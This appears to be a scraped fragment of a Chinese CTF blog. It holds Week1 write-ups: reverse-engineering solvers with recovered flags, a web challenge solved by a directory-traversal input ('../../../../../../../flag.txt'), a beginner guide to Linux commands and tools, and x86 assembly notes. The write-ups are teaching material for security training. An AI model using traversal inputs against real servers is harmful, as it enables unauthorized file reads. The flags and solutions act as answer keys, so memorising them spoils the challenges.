想到可能是目录穿越，于是果断输入../../../../../../../flag.txt，幸运地得到了flag： flag{28e57be9-3a51-4120-b46f-4fa60ceda491} Reverse[Week1] 8086ASM 题目描述：你的汇编入门了吗？ 下载附件，得到.asm文件，用记事本打开得到： .MODEL SMALL.STACK 100H.DATA WELCOME_MSG db &#x27;Welcome to 8086ASM.&#x27;, 0DH, 0AH, &#x27;$&#x27; INPUT_MSG db &#x27;Input your flag:&#x27;, &#x27;$&#x27; WRONG_MSG db 0DH, 0AH, &#x27;Wrong.&#x27;, 0DH, 0AH, &#x27;$&#x27; CORRECT_MSG db 0DH, 0AH, &#x27;Correct.&#x27;, 0DH, 0AH, &#x27;$&#x27; DATA1 DB 0BBH, 01BH, 083H, 08CH, 036H, 019H, 0CCH, 097H DB 08DH, 0E4H, 097H, 0CCH, 00CH, 048H, 0E4H, 01BH DB 00EH, 0D7H, 05BH, 065H, 01BH, 050H, 096H, 006H DB 03FH, 019H, 00CH, 04FH, 04EH, 0F9H, 01BH, 0D7H DB 0CH, 01DH, 0A0H, 0C6H DATA2 DW 01122H, 03344H, 01717H, 09090H, 0BBCCH INPUT_BUFFER db 37 dup(0) BUFFER db 37 dup(0).CODESTART: MOV AX, @DATA MOV DS, AX MOV AH, 09H MOV DX, OFFSET WELCOME_MSG INT 21H MOV DX, OFFSET INPUT_MSG INT 21H MOV AH,0AH MOV DX, OFFSET INPUT_BUFFER MOV BYTE PTR[INPUT_BUFFER], 37 INT 21H CALL ENCRYPT MOV DI, OFFSET DATA1 MOV SI, OFFSET INPUT_BUFFER + 2 MOV CX, 35LOOP1: MOV AX, [DI] CMP AX, [SI] JNE WRONG_EXIT INC DI INC SI LOOP LOOP1 JMP CORRECT_EXITWRONG_EXIT: MOV AH,09H LEA DX,WRONG_MSG INT 21H JMP EXITCORRECT_EXIT: MOV AH,09H LEA DX,CORRECT_MSG INT 21H JMP EXITEXIT: MOV AX, 4C00H INT 21HENCRYPT PROC PUSH AX PUSH BX PUSH CX MOV SI, OFFSET INPUT_BUFFER + 2 MOV BX, OFFSET DATA2 MOV CX, 35LOOP2: PUSH CX MOV CL, 2 MOV AL, [SI] ROR AL, CL POP CX MOV [SI], AL MOV AX, WORD PTR[SI] XOR AX, WORD PTR[BX] MOV WORD PTR[SI], AX INC SI ADD BX, 2 CMP BX, OFFSET DATA2 + 10 JNE CASE1 MOV BX, OFFSET DATA2 CASE1: LOOP LOOP2 POP CX POP BX POP AX RETENCRYPT ENDP END START 结构很简单，就是读取最多37个字符到INPUT_BUFFER，然后调用ENCRYPT对输入进行加密，将其结果与DATA1中的固定字节比较，根据结果输出对&#x2F;错。 加密过程： 加密过程（按字节循环）：对于 i = 0..34：1.p_i 循环右移 2 位 → 得到 t_i。2.取 (t_i, t_&#123;i+1&#125;) 组成 16 位字（小端：t_i 是低字节，t_&#123;i+1&#125; 是高字节）。3.与 w_&#123;i mod 5&#125; 异或，得到 (c_i, c_&#123;i+1&#125;)。4.因为 t_&#123;i+1&#125; 在 i 时作为高字节被改过一次，在 i+1 时作为低字节又被改一次，所以每个字节（除了首尾）被加密两次（一次作为字低字节，一次作为字高字节）。其中，设输入字节序列为：p0,p1,p2,...,p34DATA2字节序列：w0,w1,w2,w3,w4(每个16位)加密后字节序列：c0,c1,c2,...,c34 解密推导： 加密顺序是 i=0..34，解密必须逆序 i=34..0，并逆操作。加密步骤（对 i）：t_i = ROR2(p_i)(t_i, t_&#123;i+1&#125;) ^= w_&#123;i%5&#125; → (c_i, c_&#123;i+1&#125;)解密步骤（对 i 从 34 到 0）：先恢复 (t_i, t_&#123;i+1&#125;)：(t_i, t_&#123;i+1&#125;) = (c_i, c_&#123;i+1&#125;) ^ w_&#123;i%5&#125;然后 p_i = ROL2(t_i)（ROL2 是 ROR2 的逆，即循环左移 2 位）。要注意：加密时，c_&#123;i+1&#125; 在下一步 i+1 时会被作为低字节再次修改，所以解密时必须先知道 c_&#123;i+1&#125; 的最终值，才能正确回溯。但实际上，我们可以正向模拟加密，然后反向推导解密公式，但更简单的方法是直接逆向执行加密操作：逆序 i 从 34 到 0：当前 (c_i, c_&#123;i+1&#125;) 与 w_&#123;i%5&#125; 异或得到 (t_i, t_&#123;i+1&#125;)p_i = ROL2(t_i)更新 c_i = p_i但 c_&#123;i+1&#125; 在下一步 i+1-1 时会被重新计算，所以得注意顺序。 EXP： def rol2(x): return ((x &lt;&lt; 2) | (x &gt;&gt; 6)) &amp; 0xFFdef ror2(x): return ((x &gt;&gt; 2) | ((x &amp; 3) &lt;&lt; 6)) &amp; 0xFFdata1 = [ 0xBB, 0x1B, 0x83, 0x8C, 0x36, 0x19, 0xCC, 0x97, 0x8D, 0xE4, 0x97, 0xCC, 0x0C, 0x48, 0xE4, 0x1B, 0x0E, 0xD7, 0x5B, 0x65, 0x1B, 0x50, 0x96, 0x06, 0x3F, 0x19, 0x0C, 0x4F, 0x4E, 0xF9, 0x1B, 0xD7, 0x0C, 0x1D, 0xA0, 0xC6]data2_words = [0x1122, 0x3344, 0x1717, 0x9090, 0xBBCC]def decrypt(): c = data1[:] n = 35 # 扩展一个字节，因为 i=34 会修改 c[35] c.append(0) bx_idx = [i % 5 for i in range(35)] # 逆序 i 从 34 到 0 for i in range(34, -1, -1): w = data2_words[bx_idx[i]] word = c[i] | (c[i+1] &lt;&lt; 8) word ^= w c[i] = word &amp; 0xFF c[i+1] = (word &gt;&gt; 8) &amp; 0xFF # 恢复 ROR2 c[i] = rol2(c[i]) return c[:35]dec_bytes = decrypt()flag = &#x27;&#x27;.join(chr(b) for b in dec_bytes)print(flag)# flag&#123;W31c0m3_t0_8086_A5M_W0RlD___!!&#125; [Week1] jvav 题目描述：觉得Main很史可以直接去看加密 下载附件，是apk文件，用jadx-gui打开，根据描述，直接定位到EncKt类，反编译得： package com.utilis.enc;import java.util.Base64;import kotlin.Metadata;import kotlin.jvm.internal.Intrinsics;import kotlin.text.Charsets;/* compiled from: enc.kt */@Metadata(d1 = &#123;&quot;\\u0000\\u0016\\n\\u0000\\n\\u0002\\u0010\\u0012\\n\\u0000\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\u0003\\n\\u0002\\u0010\\u000b\\n\\u0000\\u001a\\u000e\\u0010\\u0000\\u001a\\u00020\\u00012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\\u001a\\u000e\\u0010\\u0004\\u001a\\u00020\\u00012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0001\\u001a\\u000e\\u0010\\u0005\\u001a\\u00020\\u00012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0001\\u001a\\u000e\\u0010\\u0006\\u001a\\u00020\\u00072\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003¨\\u0006\\b&quot;&#125;, d2 = &#123;&quot;encoder&quot;, &quot;&quot;, &quot;input&quot;, &quot;&quot;, &quot;confuser&quot;, &quot;rounder&quot;, &quot;checker&quot;, &quot;&quot;, &quot;app_release&quot;&#125;, k = 2, mv = &#123;2, 0, 0&#125;, xi = 48)/* loaded from: classes2.dex */public final class EncKt &#123; public static final byte[] encoder(String input) &#123; Intrinsics.checkNotNullParameter(input, &quot;input&quot;); byte[] bytes = input.getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(bytes, &quot;getBytes(...)&quot;); byte[] encode = Base64.getEncoder().encode(bytes); Intrinsics.checkNotNullExpressionValue(encode, &quot;encode(...)&quot;); return encode; &#125; public static final byte[] confuser(byte[] input) &#123; Intrinsics.checkNotNullParameter(input, &quot;input&quot;); int length = input.length; for (int i = 0; i &lt; length; i++) &#123; input[i] = (byte) (~((input[i] + 32) ^ 11)); &#125; return input; &#125; public static final byte[] rounder(byte[] input) &#123; Intrinsics.checkNotNullParameter(input, &quot;input&quot;); byte[] bArr = new byte[input.length]; int length = input.length; for (int i = 0; i &lt; length; i++) &#123; bArr[i] = input[(i + 5) % input.length]; &#125; return bArr; &#125; public static final boolean checker(String input) &#123; Intrinsics.checkNotNullParameter(input, &quot;input&quot;); byte[] rounder = rounder(confuser(encoder(input))); byte[] bArr = &#123;-89, 96, 102, 118, -89, -122, 103, -103, -125, -95, 114, 117, -116, -102, 114, -115, -125, 108, 110, 118, -91, -83, 101, -115, -116, -114, 124, 114, -123, -87, -87, -114, 121, 108, 124, -114&#125;; if (rounder.length != 36) &#123; return false; &#125; int length = rounder.length; for (int i = 0; i &lt; length; i++) &#123; if (rounder[i] != bArr[i]) &#123; return false; &#125; &#125; return true; &#125;&#125; 主要就是三个步骤： 1.encoder：base64编码 2.confuser：混淆运算(byte) ~((input[i] + 32) ^ 11) 3.rounder：循环移位input[(i + 5) % length] 解密的话，也分三步： a.逆向rounder： 原：bArr[i] = input[i + 5 % length] 逆向：input[i] = bArr[(i - 5 + length) % length] b.逆向confuser： 原：result = ~((input + 32) ^ 11) 逆向：input = ((~result) ^ 11) - 32 c.base64解码 最后的EXP： import base64def decrypt_flag(): encrypted = [ -89, 96, 102, 118, -89, -122, 103, -103, -125, -95, 114, 117, -116, -102, 114, -115, -125, 108, 110, 118, -91, -83, 101, -115, -116, -114, 124, 114, -123, -87, -87, -114, 121, 108, 124, -114 ] # 步骤1: 逆向rounder - 循环移位 length = len(encrypted) after_rounder = [0] * length for i in range(length): after_rounder[i] = encrypted[(i - 5) % length] # 步骤2: 逆向confuser - 位运算 after_confuser = [0] * length for i in range(length): result_byte = after_rounder[i] &amp; 0xFF not_result = 0xFF - result_byte after_confuser[i] = ((not_result ^ 11) - 32) &amp; 0xFF # 步骤3: Base64解码 try: base64_bytes = bytes(after_confuser) flag_bytes = base64.b64decode(base64_bytes) flag = flag_bytes.decode(&#x27;utf-8&#x27;) return flag except Exception as e: print(f&quot;错误: &#123;e&#125;&quot;) return Noneif __name__ == &quot;__main__&quot;: flag = decrypt_flag() print(f&quot;解密得到的flag: &#123;flag&#125;&quot;)# flag&#123;kotl1n_is_also_java&#125; [Week1] ezCSharp 题目描述：用ida看不懂？那就对了，建议换个工具（你知道dnspy吗？） 下载附件，根据提示用dnspy打开，得到DecodeFlag： private static string DecodeFlag(string encoded)&#123; char[] array = encoded.ToCharArray(); for (int i = 0; i &lt; array.Length; i++) &#123; char c = array[i]; char c2 = c; if (c2 != &#x27;!&#x27;) &#123; switch (c2) &#123; case &#x27;a&#x27;: array[i] = &#x27;z&#x27;; break; case &#x27;b&#x27;: case &#x27;c&#x27;: case &#x27;d&#x27;: case &#x27;e&#x27;: case &#x27;f&#x27;: case &#x27;g&#x27;: case &#x27;h&#x27;: case &#x27;i&#x27;: case &#x27;j&#x27;: case &#x27;k&#x27;: case &#x27;l&#x27;: case &#x27;m&#x27;: case &#x27;n&#x27;: case &#x27;o&#x27;: case &#x27;p&#x27;: case &#x27;q&#x27;: case &#x27;r&#x27;: case &#x27;s&#x27;: case &#x27;t&#x27;: case &#x27;u&#x27;: case &#x27;v&#x27;: case &#x27;w&#x27;: case &#x27;x&#x27;: case &#x27;y&#x27;: case &#x27;z&#x27;: array[i] -= &#x27;\\u0001&#x27;; break; &#125; &#125; else &#123; array[i] = &#x27;_&#x27;; &#125; &#125; return new string(array);&#125; 和[EncodedFlag(&quot;D1ucj0u!tqjwf!fohjoffsjoh!xj!epspqz!ju!gvo!2025&quot;)] 可以知道是除了数字、大写字母，小写字母逐位往前偏移一位(a变为z)，若是!，变为_。 写出EXP： enc_flag = &quot;D1ucj0u!tqjwf!fohjoffsjoh!xj!epspqz!ju!gvo!2025&quot;flag = &quot;flag&#123;&quot;for i in range(len(enc_flag)): if enc_flag[i] == &quot;!&quot;: flag += &quot;_&quot; elif enc_flag[i] == &quot;a&quot;: flag += &quot;z&quot; elif &quot;a&quot; &lt; enc_flag[i] &lt;= &quot;z&quot;: flag += chr(ord(enc_flag[i])-1) else: flag += enc_flag[i]flag += &quot;&#125;&quot;print(flag)# flag&#123;D1tbi0t_spive_engineering_wi_doropy_it_fun_2025&#125; [Week1] PlzDebugMe 题目描述：超级简单呢~快去尝试debug出flag吧！ 用IDA打开附件，start函数： int sub_401697()&#123; int i; // [esp+1Ch] [ebp-4h] sub_401860(); sub_40160C(&quot;WeLcome to Reverse World!\\n&quot;); sub_40160C(&quot;Length of the flag is 32.\\n&quot;); sub_40160C(&quot;Please enter your flag:\\n&quot;); sub_4015D0(&quot;%s&quot;, byte_415060); if ( byte_415060[0] == 102 &amp;&amp; byte_415061 == 108 &amp;&amp; byte_415062 == 97 &amp;&amp; byte_415063 == 103 &amp;&amp; byte_415064 == 123 &amp;&amp; byte_41507F == 125 ) &#123; sub_401648(123456); for ( i = 0; i &lt;= 31; ++i ) &#123; byte_415060[i] = sub_40167D((unsigned __int8)byte_415060[i]); if ( byte_415060[i] != byte_410020[i] ) &#123; sub_40160C(&quot;Pity! Wrong flag!\\n&quot;); return 0; &#125; &#125; sub_40160C(&quot;Congratulations! You get the flag!\\n&quot;); return 0; &#125; else &#123; sub_40160C(&quot;WRONG\\n&quot;); return 0; &#125;&#125; 看出byte_415060为输入的input，byte_410020为原本的flag， .data:00410020 byte_410020 db 5Bh, 50h, 0A1h, 25h, 84h, 8Eh, 61h, 0C4h, 6Bh, 0BBh.data:0041002A db 0AEh, 5, 0Bh, 0C6h, 3Dh, 42h, 5Ah, 0FBh, 0C1h, 0C9h.data:00410034 db 4Eh, 0E9h, 8Dh, 50h, 91h, 2 dup(87h), 24h, 0ADh, 0AFh.data:0041003E db 0D5h, 36h 而sub_40167D函数操作return (unsigned __int8)sub_401656() ^ a1;， sub_401656()： unsigned int sub_401656()&#123; dword_415080 = 1103515245 * dword_415080 + 12345; return HIWORD(dword_415080) &amp; 0x7FFF;&#125; sub_401648(123456);中，dword_415080 = a1 = 123456， 得到思路：密文每一位模256后与随机数key模256后的结果进行异或。 EXP： enc_flag = [0x5B, 0x50, 0xA1, 0x25, 0x84, 0x8E, 0x61, 0xC4, 0x6B, 0xBB, 0xAE, 0x05, 0x0B, 0xC6, 0x3D, 0x42, 0x5A, 0xFB, 0xC1, 0xC9, 0x4E, 0xE9, 0x8D, 0x50, 0x91, 0x87, 0x87, 0x24, 0xAD, 0xAF, 0xD5, 0x36]flag = &quot;&quot;class RandomGenerator: def __init__(self, seed=123456): # 使用32位无符号整数模拟 dword_415080 self.state = seed &amp; 0xFFFFFFFF def rand(self): # 线性同余生成器更新：X = (a * X + c) mod 2^32 self.state = (1103515245 * self.state + 12345) &amp; 0xFFFFFFFF # 提取高16位（&gt;&gt; 16），然后取其中的低15位（&amp; 0x7FFF） return (self.state &gt;&gt; 16) &amp; 0x7FFFxor_key = RandomGenerator()for i in range(len(enc_flag)): enc_flag[i] %= 256 ch = enc_flag[i] ^ (xor_key.rand()%256) flag += chr(ch)print(flag)# flag&#123;Y0u_Kn0w_H0w_t0_D3bug!!!!!&#125;","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","permalink":"https://incldue.github.io/tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/"}]},{"title":"关于CTFers在CTF赛制下の求生指南--计算机基础","slug":"关于CTFers在CTF赛制下の求生指南--计算机基础","date":"2025-09-30T01:57:00.000Z","updated":"2025-09-30T02:07:39.407Z","comments":true,"path":"2025/09/30/关于CTFers在CTF赛制下の求生指南--计算机基础/","permalink":"https://incldue.github.io/2025/09/30/%E5%85%B3%E4%BA%8ECTFers%E5%9C%A8CTF%E8%B5%9B%E5%88%B6%E4%B8%8B%E3%81%AE%E6%B1%82%E7%94%9F%E6%8C%87%E5%8D%97--%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/","excerpt":"近期在搞新生培训，为了不成为Cyber文盲，介绍一点前一年在CTF上的经验叭(doge)","text":"XAUTCTFers特供版—by SS-Team Windows的键盘快捷键(常用)： Ctrl+C&amp;Ctrl+V ：复制粘贴 Ctrl+A&amp;Ctrl+Z ：选择全部&amp;撤销操作 Win+E&amp;Win+R ：打开文件资源管理器&amp;运行框 Ctrl+F ：查找字符串（对于一些简单の签到题查找flag字符串） Ctrl+N&amp;Ctrl+S ：新建窗口等&amp;保存（对于编程，尤其python每次run都得保存） Ctrl+点击多个文件&amp;Ctrl+拖动文件 ：多选文件&amp;复制文件 Alt+Tab&amp;Alt+Enter ：切换不同正在运行の程序&amp;查看所选项属性（提高效率） Linux的常用命令： ls /&amp;ls -al ：显示目标列表(完整目录)&amp;显示目录所有文件(隐藏文件–可能有用) cd [path]&amp;pwd ：切换工作目录&amp;显示当前工作目录的绝对路径 nc ip port ：建立TCP&#x2F;UDP连接或监听端口(pwn✌) cat /[file]&amp;less [file] ：在终端打印文件内容(哈哈，cat &#x2F;flag)&amp;浏览文件内容 mv [file1] [file2]&amp;cp/mv [file1] [file2] ：移动&#x2F;重命名文件&amp;复制&#x2F;删除文件 grep [keyword] [file]&amp;find [file] ：在文件中搜索指定字符串&amp;在文件系统中搜索文件(与Ctrl+F差不多) mkdir/rmdir [dir]&amp;touch [file] ：创建&#x2F;删除目录&amp;创建空文件 chmod [options(777 / +x)] mode [file]&amp;chown [options] owner[:group] [file] ：修改文件权限(便于附件调试，一般可root)&amp;修改文件操作者 ps aux&amp;kill [PID] ：查看当前运行进程&amp;杀死进程 nano / vi / emacs [file] ：编辑文件 管道符 | ：连接命令 echo [strings] (+ &gt; [file])&amp;strings [file] ：打印文本(可写入文件)&amp;查找文件中所有字符串 科学上网(梯子)： 众所周知，国内外的网络间有一堵无形的墙阻隔，它便是中国国家防火墙，简称GFW，这导致国内用户在访问一些境外网站时受阻，但有时我们所需要的资料工具只有在境外才能获取，对于计算机相关专业更是如此，因此学会“科学上网”是必要的，“梯子”便是绕过这一限制的工具 目前来说比较好的梯子是 Clash ,有很多机场(VPN),其中 ikuu VPN是免费的，但是选择性不稳定，显示超时，足够日常使用 这里不便于展开介绍，可以看看我们学校论坛上的**梯子机场专题推荐** 搜索引擎&amp;LLM的选择： 首先搜索引擎的话，尽量不要选择百度(国内の…一言难尽)，搜到的不全，广告多；如果有条件的话(科学上网)首选Google。当然，必应也是非常推荐的 LLM的话，首选ChatGPT，当然也推荐国内的deepseek、通义千问、kimi，但像kimi这种有深度思考功能的如果算力不够(难题)容易自己陷入死循环中，不输出结果 当然，也欢迎本地部署AI和知识库","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CTF入门","slug":"CTF入门","permalink":"https://incldue.github.io/tags/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"汇编学习01","slug":"汇编学习01（X86）","date":"2025-07-17T16:00:00.000Z","updated":"2025-09-26T15:44:46.983Z","comments":true,"path":"2025/07/18/汇编学习01（X86）/","permalink":"https://incldue.github.io/2025/07/18/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A001%EF%BC%88X86%EF%BC%89/","excerpt":"学习逆向RE的前置知识，浅浅记录一下，不定时更新~","text":"汇编学习01（X86）0x01 寄存器(Registers) 现代的x86处理器有8个32位通用寄存器： ​ 同时，在里面EAX也被称为累加器 ；ECX为 计数器，其被用为保存循环的索引（次数）。 对于EAX、EBX、ECX以及EDX，它们可被分段开来使用。例如，可以把EAX的最低2位字节视为16位寄存器（AX），也可将AX的最低位1位字节视为8位寄存器（AL），同时AX的高位1个字节也可看成8位寄存器（AH）。当2字节大小的数据放入DX中，原本DH、DL、EDX的数据会受到相应的影响。 0x02 内存&amp;寻址模式 声明静态数据区域： a.可在内存中声明静态数据区域(类似全局变量)。.data指令用来声明数据，使得**.byte、.short、.long**可分别声明 1 、2和 4 个字节的数据。 b.同时我们可以打上标签，来引用所创建的数据地址。其给内存地址命名，而编译器&amp;链接器 将其翻译成机器代码。 c.例子如下： .datavar: .byte 64 ;声明字节型变量var，所对应数据为64 .byte 10 ;声明数据10，无标签，内存地址为 var+1 x: .short 42 ;声明大小为2字节的数据，有标签&quot;x&quot;y: .long 3000 ;声明大小为4字节的数据，有标签&quot;y&quot;，初始 化值为3000 内存寻址： a.现代的x86处理器可寻址高达2^32位字节的内存(内存地址为32位宽)。 b.除了支持标签引用存储区域外，x86还提供了另一种计算&amp;引用内存地址的方案：最多可将两个32位寄存器与一个32位有符号常量相加以计算存储器地址（其中一个可选择先*2、4或8）。 c.用mov做例子： mov (%ebx), %eax ;从EBX中的内存地址加载4字节的数据到EAX，(%ebx)表示寄存器ebx中所存储的内容。mov %ebx, var(,1) ;将EBX中4字节大小的数据--&gt;内存中标签为var的地方去。(var为32位常数)mov (%esi, %ebx, 4), %edx ;将内存中标签为ESI+4*EBX所对应的4字节大小的数据--&gt;EDX中。 操作后缀 a.当我们加载一个32位寄存器时，编译器可推断出所用内存为4个字节宽，但有时候大小并不明确。 b.这时得用到前缀 b、w和 l 来分别表示1、2和4个字节的大小。 1.movb $2, (%ebx) ;将2--&gt;ebx所代表的地址单元中2.movw $2, (%ebx) ;将 16 位整数2--&gt;从ebx地址单元开始的2个字节中3.movl $2, (%ebx) ;将 32 位整数 2--&gt;从ebx中的值表示的地址单元 开始的4个字节中 指令：分为 数据移动指令 、逻辑运算指令 、流程控制指令 。 使用： 1.&lt;reg32 ;任意32位寄存器(%eax, %ebx, %ecx, %edx, %esi, %edi, %esp或者%eb)2.&lt;reg16 ;任意16位寄存器(%ax, %bx, %cx 或者%dx)3.&lt;reg8 ;任意8位寄存器(%ah, %al, %bh, %bl, %ch, %cl, %dh, %dl)4.&lt;reg ;任意寄存器5.&lt;mem ;一个内存地址,如(%eax), 4+var, (%eax, %ebx, 1)6.&lt;con32 ;32位常数7.&lt;con16 ;16位常数8.&lt;con8 ;8位常数9.&lt;con ;任意32位, 16位或者8位常数 (同时所有标签&amp;数字常量以**$**为前缀，需要时前缀 0x 表示十六进制数) a.数据移动–mov(移动)：当寄存器到寄存器之间的数据移动可行时, 直接从内存单元中将数据移动到另一内存单元中是不行的. 在这种需要在内存单元中传递数据的情况下, 它数据来源的那个内存单元必须首先把那个内存单元中的数据加载到一个寄存器中, 之后才可通过这个寄存器来把数据移动到目标内存单元中。 mov &lt;reg, &lt;reg ;语法mov &lt;reg, &lt;memmov &lt;mem, &lt;regmov &lt;con, &lt;regmov &lt;con, &lt;memmov %ebx, %eax ;将EBX中的值复制到EAX中 ;例子 mov $5, var(,1) ;将5存到字节型内存单元&quot;var&quot; b.数据移动–push(入栈)：将其参数移动到硬件支持的栈内存顶端. 特别地, 其先将 ESP 中的值减少 4, 然后移动到一个 32 位地址单元 ( %esp ). ESP ( 栈指针 ) 会随着不断入栈持续递减, 即栈内存是从高地址单元到低地址单元增长。 push &lt;reg32 ;语法push &lt;mempush &lt;con32push %eax ;将EAX送入栈 ;例子push var(,1) ;将var对应4字节大小数据送入栈中 c.数据移动–pop(出栈)：从硬件支持的栈内存顶端移除4字节数据, 并把其放到该指令指定的参数中 ( 寄存器&#x2F;内存单元 ). 其首先将内存中 ( %esp ) 的 4 字节数据放到指定寄存器或者内存单元中, 然后让 ESP + 4。 pop &lt;reg32 ;语法pop &lt;mempop %edi ;将栈顶的元素移除, 并放入到寄存器EDI中pop (%ebx) ;将栈顶的元素移除, 并放入从EBX开始的4字节大小内存单元中注意：栈的访问形式为“先进后出，后进先出” d.数据移动–lea(加载有效地址)：将其第一个参数指定的内存单元放入到 第二个参数指定的寄存器中。注意, 该指令不加载内存单元中的内容, 只是计算有效地址并将其放入寄存器。 与 mov 的区别? mov是传送数据(如MOV AX,[1000H]是将1000H作为偏移地址寻址到内存单元，将数据–&gt;AX ) ;而lea是取偏移地址(如LEA AX,[1000H]是将[1000H]的偏移地址–&gt;AX，等同于MOV AX,1000H)。 lea &lt;mem, &lt;reg32lea (%ebx,%esi,8), %edi ;EBX+8*ESI的值被移入EDIlea val(,1), %eax ;val的值被移入EAX e.逻辑运算–add(整数相加)：将两参数相加, 然后将结果存放到第二个参数中. 注意, 参数可以是寄存器,但参数中最多只有一个内存单元。 逻辑运算–sub(整数相减)：将第二个参数的值与第一个相减, 就是后面那个减去前面那个, 然后把结果存储到第二个参数。 add &lt;reg, &lt;regadd &lt;mem, &lt;regadd &lt;reg, &lt;memadd &lt;con, &lt;regadd &lt;con, &lt;memadd $10, %eax ;EAX中的值被设置为EAX+10addb $10, (%eax) ;往EAX中内存单元地址加1字节数字10sub &lt;reg, &lt;regsub &lt;mem, &lt;regsub &lt;con, &lt;regsub &lt;con, &lt;memsub %ah, %al ;AL被设置成AL-AHsub $216, %eax ;将EAX值减216 f.逻辑运算–inc、dec(自增，自减)：分别让参数+1、-1。 inc &lt;reginc &lt;memdec &lt;regdec &lt;memdec %eax ;EAX中的值-1incl var(,1) ;将var所代表的32位整数+1. g.逻辑运算–imul(整数相乘)：有两种基本格式 : 第一种是2 个参数的 ( 先将两参数相乘, 然后把结果存到第二个参数中. 运算结果必须是一个寄存器 ); 第二种格式是3 个参数的 ( 先将其第 1 个参数和第 2 个参数相乘, 然后把结果存到第 3 个参数中,其必须是一个寄存器。此外, 第 1 个参数必须是一个常数 ). ​ 逻辑运算–idiv(整数相除)：只有一个操作数，此操作数为除数，而被除数则为EDX: EAX 中的内容（一个64位整数）， 除法结果 ( 商 ) 存在于EAX 中, 而所得的余数存在 EDX 中 imul &lt;reg32, &lt;reg32imul &lt;mem, &lt;reg32imul &lt;con, &lt;reg32, &lt;reg32imul &lt;con, &lt;mem, &lt;reg32imul (%ebx), %eax ;将EAX中的32位整数,与EBX中内存单元相乘, 然后把结果存到EAX中imul $25, %edi, %esi ;ESI被设置为EDI*25idiv &lt;reg32idiv &lt;memidiv %ebx ;用EDX:EAX的值除以EBX的值.商存放在EAX中,余数存放在EDX中.idivw (%ebx) ;将EDX:EAX的值除以存储在EBX所对应内存单元的32位值. 商存放在EAX中, 余数存放在EDX中 h.逻辑运算–and, or, xor(按位逻辑 与，或，非)：分别对它们的参数进行相应的逻辑运算, 运算结果存到第一个参数中。 and &lt;reg, &lt;regand &lt;mem, &lt;regand &lt;reg, &lt;memand &lt;con, &lt;regand &lt;con, &lt;memor &lt;reg, &lt;regor &lt;mem, &lt;regor &lt;reg, &lt;memor &lt;con, &lt;regor &lt;con, &lt;memxor &lt;reg, &lt;regxor &lt;mem, &lt;regxor &lt;reg, &lt;memxor &lt;con, &lt;regxor &lt;con, &lt;memand $0x0F, %eax ;只留下EAX中最后4位数字(二进制位)xor %edx, %edx ;将EDX的值全设置成0 i.逻辑运算–not(逻辑位运算 非)：对参数进行逻辑非运算, 即翻转参数中所有位的值。 not &lt;regnot &lt;memnot %eax ;将EAX所有值翻转 j.逻辑运算–shl, shr(按位左移&#x2F;右移)：对第一个参数进行位运算, 移动的位数由第二个参数决定, 移动过后的空位拿 0 补上.被移的参数最多可以被移 31 位. 第二个参数可以是 8 位常数或者寄存器 CL. 在任意情况下, 大于 31 的移位都默认是与 32 取模。 shl &lt;con8, &lt;regshl &lt;con8, &lt;memshl %cl, &lt;regshl %cl, &lt;memshr &lt;con8, &lt;regshr &lt;con8, &lt;memshr %cl, &lt;regshr %cl, &lt;memshl $1, %eax ;将EAX的值*2 (如果最高有效位是0)shr %cl, %ebx ;将EBX的值/2n, 其n为CL中的值, 运算最终结果存到EBX中. [!IMPORTANT] x86处理器有**指令指针寄存器(EIP)，为32位寄存器，用来在内存中指示输入汇编指令的位置，指向哪个内存单元。 我们用&lt;label来当作标签，输入标签+冒号，可将其插入x86汇编代码任意位置。 k.流程控制–jmp(跳转指令)：将程序跳转到参数指定的内存地址, 然后执行该内存地址的指令。 jmp &lt;labeljmp begin ;跳转到打了&quot;begin&quot;标签的位置 l.流程控制–jcondition(有条件跳转)：是条件跳转指令，基于一组条件代码的状态，这些状态存放在叫机器状态字的寄存器中，其内容包括关于最后执行的算术运算的信息。 je &lt;label ;当相等的时候跳转jne &lt;label ;当不相等的时候跳转jz &lt;label ;当最后结果为 0 的时候跳转jg &lt;label ;当大于的时候跳转jge &lt;label ;当大于等于的时候跳转jl &lt;label ;当小于的时候跳转jle &lt;label ;当小于等于的时候跳转cmp %ebx, %eaxjle done;若EAX的值 &lt;= EBX的值, 就跳转到&quot;done&quot;标签,否则继续执行下一条指令 m.流程控制–cmp(比较指令)：比较两个参数的值, 适当地设置机器状态字中的条件代码. 此指令与sub指令类似，但是cmp不用将计算结果保存在操作数中。 cmp &lt;reg, &lt;regcmp &lt;mem, &lt;regcmp &lt;reg, &lt;memcmp &lt;con, &lt;regcmpb $10, (%ebx)jeq loop;若EBX的值等于整数常量10,则跳转到标签&quot;loop&quot;的位置 n.流程控制–call、ret(子程序调用&amp;返回)：实现子程序的调用和返回。call指令首先把当前代码位置推到内存中硬件支持的栈内存上，然后无条件跳转到标签参数指定的代码位置，在其结束后，返回调用之前的位置；ret指令则实现子程序的返回，其首先从栈中取出代码(类似于pop),然后无条件跳转到检索到的代码位置。 call &amp;lt;labelret5 调用约定(关于如何从例程调用&amp;返回的协议)：分为两组:第一组是面向子例程的调用者的；第二组则是面向子例程的编写者，即被调用者。 a.调用者约定：要调用子例程，请使用call指令(将返回地址存到栈上，并跳转到子程序的代码，其中子程序应遵循被调用者约定) 例子：push (%ebx) ;最后一个参数最先入栈push $216 ;把第二个参数入栈push %eax ;第一个参数最后入栈call myFunc ;调用这个函数(假设以C语言模式命名)add $12, %esp ;清理栈内存 b.被调用者约定：应先将EBP的值入栈，再将ESP的值复制到EBP中(保留基指针EBP以作为栈上找到参数&amp;变量的参考点) 